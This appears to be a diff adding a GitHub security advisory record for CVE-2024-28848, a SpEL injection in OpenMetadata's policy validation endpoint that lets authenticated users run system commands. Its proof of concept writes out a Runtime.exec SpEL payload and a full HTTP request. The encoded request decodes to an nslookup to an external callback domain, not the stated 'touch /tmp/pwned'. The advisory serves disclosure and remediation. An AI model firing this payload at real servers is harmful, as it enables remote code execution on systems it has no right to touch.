@@ -1,0 +1,77 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-5xv3-fm7g-865r",
+  "modified": "2024-04-24T17:06:02Z",
+  "published": "2024-04-24T17:06:02Z",
+  "aliases": [
+    "CVE-2024-28848"
+  ],
+  "summary": "OpenMetadata vulnerable to a SpEL Injection in `GET /api/v1/policies/validation/condition/<expr>` (`GHSL-2023-236`)",
+  "details": "### SpEL Injection in `GET /api/v1/policies/validation/condition/<expr>` (`GHSL-2023-236`)\n\n***Please note, only authenticated users have access to PUT / POST APIS for /api/v1/policies. Non authenticated users will not be able to access these APIs to exploit the vulnerability. A user must exist in OpenMetadata and have authenticated themselves to exploit this vulnerability.***\n\nThe [`‎CompiledRule::validateExpression`](https://github.com/open-metadata/OpenMetadata/blob/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java#L51) method evaluates an SpEL expression using an [`StandardEvaluationContext`](https://github.com/open-metadata/OpenMetadata/blob/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java#L57), allowing the expression to reach and interact with Java classes such as `java.lang.Runtime`, leading to Remote Code Execution. The `/api/v1/policies/validation/condition/<expression>` endpoint passes user-controlled data `CompiledRule::validateExpession` allowing authenticated (non-admin) users to execute arbitrary system commands on the underlaying operating system.\n\n[Snippet from PolicyResource.java](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/policies/PolicyResource.java#L448)\n\n```java\n  @GET\n  @Path(\"/validation/condition/{expression}\")\n  @Operation(\n      operationId = \"validateCondition\",\n      summary = \"Validate a given condition\",\n      description = \"Validate a given condition expression used in authoring rules.\",\n      responses = {\n        @ApiResponse(responseCode = \"204\", description = \"No value is returned\"),\n        @ApiResponse(responseCode = \"400\", description = \"Invalid expression\")\n      })\n  public void validateCondition(\n      @Context UriInfo uriInfo,\n      @Context SecurityContext securityContext,\n      @Parameter(description = \"Expression of validating rule\", schema = @Schema(type = \"string\"))\n          @PathParam(\"expression\")\n          String expression) {\n    CompiledRule.validateExpression(expression, Boolean.class);\n  }\n```\n\n```java\n  public static <T> void validateExpression(String condition, Class<T> clz) {\n    if (condition == null) {\n      return;\n    }\n    Expression expression = parseExpression(condition);\n    RuleEvaluator ruleEvaluator = new RuleEvaluator();\n    StandardEvaluationContext evaluationContext = new StandardEvaluationContext(ruleEvaluator);\n    try {\n      expression.getValue(evaluationContext, clz);\n    } catch (Exception exception) {\n      // Remove unnecessary class details in the exception message\n      String message = exception.getMessage().replaceAll(\"on type .*$\", \"\").replaceAll(\"on object .*$\", \"\");\n      throw new IllegalArgumentException(CatalogExceptionMessage.failedToEvaluate(message));\n    }\n  }\n```\n\nIn addition, there is a missing authorization check since `Authorizer.authorize()` is never called in the affected path and therefore any authenticated non-admin user is able to trigger this endpoint and evaluate arbitrary SpEL expressions leading to arbitrary command execution.\n\nThis vulnerability was discovered with the help of CodeQL's [Expression language injection (Spring)](https://codeql.github.com/codeql-query-help/java/java-spel-expression-injection/) query.\n#### Proof of concept\n\n- Prepare the payload\n\t- Encode `touch /tmp/pwned` in Base64 => `dG91Y2ggL3RtcC9wd25lZA==`\n\t- SpEL expression to run system command: `T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode(\"dG91Y2ggL3RtcC9wd25lZA==\")))`\n\t- Encode the payload using URL encoding:\n```\n%54%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%54%28%6a%61%76%61%2e%75%74%69%6c%2e%42%61%73%65%36%34%29%2e%67%65%74%44%65%63%6f%64%65%72%28%29%2e%64%65%63%6f%64%65%28%22%64%47%39%31%59%32%67%67%4c%33%52%74%63%43%39%77%64%32%35%6c%5a%41%3d%3d%22%29%29%29\n```\n\n- Send the payload using a valid JWT token:\n```http\nGET /api/v1/policies/validation/condition/%54%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%29%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%54%28%6a%61%76%61%2e%75%74%69%6c%2e%42%61%73%65%36%34%29%2e%67%65%74%44%65%63%6f%64%65%72%28%29%2e%64%65%63%6f%64%65%28%22%62%6e%4e%73%62%32%39%72%64%58%41%67%61%58%70%73%4e%7a%45%33%62%33%42%69%62%57%52%79%5a%57%46%6f%61%33%4a%6f%63%44%4e%72%63%32%70%72%61%47%4a%75%4d%6d%4a%7a%65%6d%67%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%3d%22%29%29%29 HTTP/2\nHost: sandbox.open-metadata.org\nAuthorization: Bearer <non-admin JWT>\n```\n- Verify that a file called `/tmp/pwned` was created in the OpenMetadata server\n#### Impact\n\nThis issue may lead to Remote Code Execution by a registered and authenticated user.\n\n#### Remediation\n\nUse [`SimpleEvaluationContext`](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.open-metadata:openmetadata-service"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.2.4"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-metadata/OpenMetadata/security/advisories/GHSA-5xv3-fm7g-865r"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28848"
+    },
+    {
+      "type": "WEB",
+      "url": "https://codeql.github.com/codeql-query-help/java/java-spel-expression-injection"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/open-metadata/OpenMetadata"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-metadata/OpenMetadata/blob/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java#L51"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-metadata/OpenMetadata/blob/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java#L57"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-04-24T17:06:02Z",
+    "nvd_published_at": "2024-03-15T20:15:10Z"
+  }
+}
